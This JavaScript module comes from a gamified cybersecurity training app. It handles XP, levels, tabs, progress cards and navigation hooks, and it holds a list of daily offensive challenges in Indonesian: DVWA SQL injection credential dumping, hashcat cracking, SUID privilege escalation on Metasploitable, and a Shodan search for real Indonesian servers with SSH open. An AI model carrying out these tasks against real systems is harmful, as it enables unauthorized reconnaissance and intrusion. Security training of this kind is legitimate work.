// ================================================================
// TABS
// ================================================================
function cvSwitchTab(tab, btn) {
  document.querySelectorAll('.cv-tab-content').forEach(c => c.classList.remove('active'));
  document.querySelectorAll('.cv-tab').forEach(b => b.classList.remove('active'));
  const el = document.getElementById('cv-tab-' + tab);
  if (el) el.classList.add('active');
  if (btn) btn.classList.add('active');
  else {
    document.querySelectorAll('.cv-tab').forEach(b => { if (b.getAttribute('onclick')?.includes("'" + tab + "'")) b.classList.add('active'); });
  }
  cvState.currentTab = tab;
}

// ================================================================
// XP & LEVEL
// ================================================================
function cvAddXP(amount) {
  if (!amount) return;
  cvState.xp += amount;
  // Level up
  const nextReq = CV_XP_LEVELS[cvState.level] || 99999;
  if (cvState.xp >= nextReq && cvState.level < CV_XP_LEVELS.length) {
    cvState.level++;
    cvShowBadge('🎉 Level Up! Lv ' + cvState.level);
  }
  cvUpdateXPBar();
  cvSave();
  // Sync with TypeCraft global XP
  if (typeof addXP === 'function') addXP(amount);
  if (typeof showToast === 'function') showToast('🔐', '+' + amount + ' XP');
}

function cvUpdateXPBar() {
  const xp = cvState.xp;
  const lvl = cvState.level;
  const cur = CV_XP_LEVELS[lvl - 1] || 0;
  const next = CV_XP_LEVELS[lvl] || (cur + 500);
  const pct = Math.min(Math.round(((xp - cur) / (next - cur)) * 100), 100);
  const rank = cvGetRank(xp);

  const el = id => document.getElementById(id);
  if (el('cv-xp-display')) el('cv-xp-display').textContent = xp;
  if (el('cv-level-display')) el('cv-level-display').textContent = lvl;
  if (el('cv-rank-pill')) el('cv-rank-pill').textContent = rank;
  if (el('cv-rank-label')) el('cv-rank-label').textContent = rank;
  if (el('cv-xp-bar')) el('cv-xp-bar').style.width = pct + '%';
  if (el('cv-xp-cur')) el('cv-xp-cur').textContent = xp - cur;
  if (el('cv-xp-next')) el('cv-xp-next').textContent = next - cur;
  if (el('cv-streak-display') && typeof userData !== 'undefined') el('cv-streak-display').textContent = userData.streak || 0;
}

// ================================================================
// PROGRESS OVERVIEW
// ================================================================
function cvRenderProgressOverview() {
  const el = document.getElementById('cv-progress-overview');
  if (!el) return;
  el.innerHTML = CV_CURRICULUM.map(lv => {
    const done = lv.topics.filter(t => cvState.completedTopics.includes(t.id)).length;
    const pct = Math.round((done / lv.topics.length) * 100);
    return `<div class="cv-progress-card" onclick="cvOpenTopic(${lv.id}, 0)">
      <div class="pc-icon">${lv.icon}</div>
      <div class="pc-name">${lv.name}</div>
      <div class="pc-bar-wrap"><div class="pc-bar" style="width:${pct}%"></div></div>
      <div class="pc-pct">${done}/${lv.topics.length} · ${pct}%</div>
    </div>`;
  }).join('');
}

// ================================================================
// DAILY CHALLENGE
// ================================================================
const CV_DAILY = [
  { title: 'Nmap Scan Challenge', desc: 'Scan 192.168.1.1 dan identifikasi 3 port terbuka. Bonus XP: 150' },
  { title: 'SQL Injection Lab', desc: 'Exploit DVWA SQLi di level Low. Dump username & password. Bonus: 200 XP' },
  { title: 'Hash Cracking', desc: 'Crack 5 MD5 hash berikut menggunakan hashcat + rockyou.txt. Bonus: 120 XP' },
  { title: 'Log Analysis', desc: 'Temukan IP yang melakukan brute force dari file auth.log. Bonus: 100 XP' },
  { title: 'OSINT Challenge', desc: 'Gunakan Shodan untuk temukan 3 server dengan port 22 terbuka di Indonesia. Bonus: 180 XP' },
  { title: 'Python Scripting', desc: 'Buat script Python untuk scan port 1-1000 pada 192.168.1.1. Bonus: 160 XP' },
  { title: 'Privilege Escalation', desc: 'Di Metasploitable, eskalasi dari www-data ke root menggunakan SUID. Bonus: 220 XP' },
];

function cvUpdateDailyChallenge() {
  const day = new Date().getDay();
  const ch = CV_DAILY[day % CV_DAILY.length];
  const t = document.getElementById('cv-daily-title');
  const d = document.getElementById('cv-daily-desc');
  if (t) t.textContent = ch.title;
  if (d) d.textContent = ch.desc;
}

function cvStartDailyChallenge() {
  cvOpenTopic(CV_CURRICULUM[0].id, 0);
  if (typeof showToast === 'function') showToast('🎯', 'Daily challenge dimulai! Selesaikan untuk bonus XP.');
}

// ================================================================
// UTILS
// ================================================================
function cvEsc(str) {
  return (str || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

function cvCopyText(text, btn) {
  navigator.clipboard?.writeText(text).then(() => {
    if (btn) { const o = btn.textContent; btn.textContent = '✓ Copied!'; setTimeout(() => btn.textContent = o, 1500); }
    else if (typeof showToast === 'function') showToast('📋','Disalin!');
  }).catch(() => {
    const ta = document.createElement('textarea');
    ta.value = text; document.body.appendChild(ta); ta.select();
    document.execCommand('copy'); ta.remove();
  });
}

function cvShowBadge(msg) {
  let badge = document.getElementById('cv-badge-popup');
  if (!badge) {
    badge = document.createElement('div');
    badge.id = 'cv-badge-popup';
    badge.className = 'cv-badge-popup';
    document.body.appendChild(badge);
  }
  badge.textContent = msg;
  badge.classList.add('show');
  setTimeout(() => badge.classList.remove('show'), 3000);
}

// ================================================================
// HOOK NAVIGATE
// ================================================================
(function hookCyberV2() {
  function doHook() {
    const orig = typeof navigate === 'function' ? navigate : null;
    if (orig && !window._cvNavigatePatched) {
      window._cvNavigatePatched = true;
      window.navigate = function(page) {
        orig(page);
        if (page === 'cyberv2') setTimeout(() => cvInit(), 100);
      };
      console.log('CyberV2: navigate() patched ✓');
    }
    if (typeof PAGE_TITLES !== 'undefined') PAGE_TITLES['cyberv2'] = '🔐 Cyber Security';
  }
  doHook();

  // Patch sidebar + dashboard
  setTimeout(() => {
    doHook();
    const sidebar = document.getElementById('sidebar');
    if (sidebar && !sidebar.querySelector('[onclick*="cyberv2"]')) {
      const item = document.createElement('div');
      item.className = 'nav-item';
      item.setAttribute('onclick', "navigate('cyberv2')");
      item.innerHTML = '<span class="nav-icon">🔐</span><span class="nav-label">Cyber Security</span>';
      // Insert after English Trainer if exists
      const enItem = [...sidebar.querySelectorAll('.nav-item')].find(n => n.getAttribute('onclick')?.includes('entrainer'));
      if (enItem?.nextSibling) sidebar.insertBefore(item, enItem.nextSibling);
      else sidebar.appendChild(item);
    }
    const grid = document.querySelector('.modes-grid');
    if (grid && !grid.querySelector('[data-cvv2]')) {
      const card = document.createElement('div');
      card.className = 'mode-card';
      card.dataset.cvv2 = '1';
      card.style.setProperty('--card-color', '#5de0a0');
      card.setAttribute('onclick', "navigate('cyberv2')");
      card.innerHTML = `<div class="mode-icon">🔐</div><h3>Cyber Security</h3><p>17 topik lengkap dari Networking hingga Bug Bounty. Materi, terminal simulator, quiz, dan challenge nyata.</p><span class="mode-tag">4 tahap · 17 topik · quiz + challenge</span>`;
      grid.appendChild(card);
    }
  }, 600);

  // Click fallback — pastikan cvInit terpanggil walau navigate belum sempat di-patch
  document.addEventListener('click', e => {
    const el = e.target.closest('[onclick*="cyberv2"]');
    if (el) setTimeout(() => cvInit(), 150);
  });

  // Jika page sudah active saat load (reload di tengah halaman ini)
  document.addEventListener('DOMContentLoaded', () => {
    const page = document.getElementById('page-cyberv2');
    if (page && page.classList.contains('active')) cvInit();
  });
})();

console.log('CyberTrainer v2: Module loaded ✓ — ' + CV_CURRICULUM.reduce((a,l)=>a+l.topics.length,0) + ' topik tersedia');
